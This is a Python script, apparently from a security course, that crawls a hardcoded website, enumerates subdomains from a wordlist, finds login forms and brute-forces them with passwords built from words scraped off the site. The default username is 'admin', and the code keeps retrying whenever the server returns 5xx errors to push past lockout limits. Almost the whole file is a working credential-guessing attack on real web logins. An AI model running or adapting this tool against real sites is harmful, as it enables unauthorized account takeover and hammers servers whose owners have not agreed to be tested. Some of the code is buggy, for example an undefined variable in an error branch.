from html_parser import HTMLParser
from password_generator import generate_password_list
from requests import get_request, get_status, post_request
from url_utils import extract_url_parts, reformat_url

import argparse
import collections
import socket

SUBDOMAINS_FILE_PATH = './subdomains-100.txt'

class Node:
    def __init__(self, url, depth):
        self.url = url
        self.depth = depth

class Counter:
    def __init__(self, count, max_depth, page_max):
        self.count = count
        self.max_depth = max_depth
        self.page_max = page_max

def add_duplicate_url(url, seen):
    # If the URL has a trailing slash, add the URL without the slash to set of seen nodes
    if url[-1] == '/':
        seen.add(url[:-1])
        
    # Else the URL doesn't have a trailing slash and add the URL with a slash to set of seen nodes
    else:
        seen.add(url + '/')       

def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, counter):
    if counter.count >= counter.page_max:
        print('Crawling aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
        return

    print('Depth ' + str(node.depth) + ': Processing: ' + node.url)
    
    # Make GET request to the current URL      
    html_doc = get_request(node.url, header_dict)
    if html_doc is not None:
        counter.count += 1

        parser = HTMLParser(html_doc)

        # Extract and add words from current page to the set of keywords
        keywords |= parser.extract_words()

        # If a login form is found, add it to the set
        form_found = parser.detect_login_form()
        if form_found:
            forms.add(node.url)

        # Add reachable URLs from current node if its depth < max depth
        if node.depth < counter.max_depth:
            # Retrieve set of URLs reachable from current node 
            linked_urls = parser.extract_urls()

            for url in linked_urls:
                # Reformat if relative url given
                if 'http' not in url:
                    url = reformat_url(url, node.url)                 

                if url not in seen and url.startswith(start_url):
                    seen.add(url)
                    add_duplicate_url(url, seen)
                    # Traversal dependent function to add next node
                    add_next(url) 

def crawl_bfs(start_url, header_dict, counter):
    print('Starting Breadth-First Crawling')
    print('-' * 50)
    forms = set()
    keywords = set()
    seen = set()
    queue = collections.deque()
    
    # Add start URL to the queue and set of seen URLs
    start_node = Node(start_url, 0)
    queue.append(start_node)
    seen.add(start_node.url)
    add_duplicate_url(start_node.url, seen)

    # While queue is not empty
    while queue:
        node = queue.popleft()
        add_to_queue = lambda url: queue.append(Node(url, node.depth + 1))  
        process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue, counter)

        if counter.count >= counter.page_max:
            return keywords, forms, seen
        
    return keywords, forms, seen

def crawl_dfs(start_url, header_dict, counter):
    """ Wrapper function to initialize first call to recursive DFS crawl function """
    
    print('Starting Depth-First Crawling')
    print('-' * 50)    
    forms = set()
    keywords = set()
    seen = set()

    start_node = Node(start_url, 0)
    # Add start URL to the set of seen URLs
    seen.add(start_node.url)
    add_duplicate_url(start_node.url, seen)
    
    _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen, counter)
    return keywords, forms, seen

def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen, counter):
    if counter.count >= counter.page_max:
        return
    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen, counter)
    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack, counter) 

def read_subdomains():
    with open(SUBDOMAINS_FILE_PATH, "r") as f:
        return {subdomain.rstrip() for subdomain in f}

def get_subdomains(url):
    subdomains = read_subdomains()
    host, _, _ = extract_url_parts(url)
    
    url_subdomain = host.split('.')[0] # Subdomain of given URL
    
    # Check to see if the URL already has a subdomain from the list
    if url_subdomain in subdomains:
        host = host.replace(url_subdomain + '.', '')

    return {subdomain + '.' + host for subdomain in subdomains}

def crawl_subdomains(bfs, url, header_dict, counter):
    for subdomain in get_subdomains(url):
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Test whether subdomain exists 
            conn.connect((subdomain, 80))
            subdomain = reformat_url(subdomain)
            if bfs:
                crawl_bfs(subdomain, header_dict, counter)
            else:
                crawl_dfs(subdomain, header_dict, counter)            
        except socket.gaierror:
            print('Subdomain ' + subdomain + ' was not found.')
        finally:
            conn.close()    
            
def brute_force(user, keywords, forms, user_agent):
    passwords = set()
    for word in keywords:
        print(word, '  :  ', generate_password_list(word))
        passwords.update(generate_password_list(word))

    for form in forms:
        print('\nAttempting to brute-force: ' + form + '\n')
        get_header = {'User-Agent': user_agent}
        html_doc = get_request(form, get_header)
        parser = HTMLParser(html_doc)

        for password in passwords:
            login = parser.create_login_string(user, password)
            post = {'User-Agent': user_agent,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': str(len(login))}

            response = post_request(form, post, login)
            
            if get_status(response) >= 500:
                print('Hold on, too many failed attempts! Waiting for the server to accept more login requests...')
            
            # Continually retry logging in if there is a server error (too many failed attempts)
            while get_status(response) >= 500:
                response = post_request(form, post, login)

            print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)

            if get_status(response) == 302:
                print('Login Succeeded!\n')
                break
            else:
                print('Login Failed...\n')
        
        print('Ran out of passwords! Bruteforce failed!')
          
def main():
    parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
    parser.add_argument('--u', nargs=1, type=str, help='USERNAME')
    parser.add_argument('--maxdepth', nargs=1, type=int, help='MAX DEPTH TO CRAWL')
    parser.add_argument('--maxpages', nargs=1, type=int, help='MAX PAGES TO CRAWL')
    parser.add_argument('--mode', nargs=1, type=str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
    args = parser.parse_args()
    username, mode = '',''
    maxdepth, maxpage = 0,0
    if (args.u ==None):
        username = 'admin'
    else :
        username = args.u.pop()
    if (args.maxdepth == None):
        maxdepth = 10
    else :
        maxdepth = args.maxdepth.pop()
    if (args.maxpages == None):
        maxpage = 10
    else :
        maxpage = args.maxpages.pop()
    if (not(args.mode == 'bfs' or args.mode == 'dfs')):
        mode = 'bfs'
    else :
        mode = args.mode.pop()

    url = 'http://stonybrook.be'
    url = reformat_url(url)
    page_counter = Counter(0, maxdepth, maxpage)


    if mode == 'bfs':
        """
        BFS
        """
        keywords, forms, seen = crawl_bfs(url, {}, page_counter)
        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
        crawl_subdomains(True, url, {}, page_counter)
        brute_force(username, keywords, forms, '')
    elif mode == 'dfs':
        """
        DFS
        """
        keywords, forms, seen = crawl_dfs(url, {}, page_counter)
        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
        brute_force(username, keywords, forms, '')
    else:
        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(search_algo))
        return

    print('\n\n\n', get_subdomains(url))

if __name__ == '__main__':
    main()

    